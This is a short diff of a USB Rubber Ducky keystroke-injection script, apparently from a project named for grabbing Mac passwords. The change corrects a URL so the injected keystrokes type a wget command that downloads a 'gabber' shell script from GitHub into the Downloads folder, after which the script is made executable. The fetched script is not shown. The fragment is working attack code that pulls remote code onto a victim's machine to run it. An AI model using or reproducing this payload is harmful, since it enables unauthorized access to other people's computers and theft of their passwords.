@@ -13,7 +13,7 @@ ENTER
 DELAY 1000
 
 REM Downloading gabber script and making it executable
-STRING wget -O ~/Downloads/_g.sh https://github.com/ohbriansung/usb_rubber_ducky/auto_mac_pw_grab/gabber.sh
+STRING wget -O ~/Downloads/_g.sh https://github.com/ohbriansung/usb_rubber_ducky/raw/master/auto_mac_pw_grab/gabber.sh
 ENTER
 DELAY 1000
 STRING chmod +x ~/Downloads/_g.sh
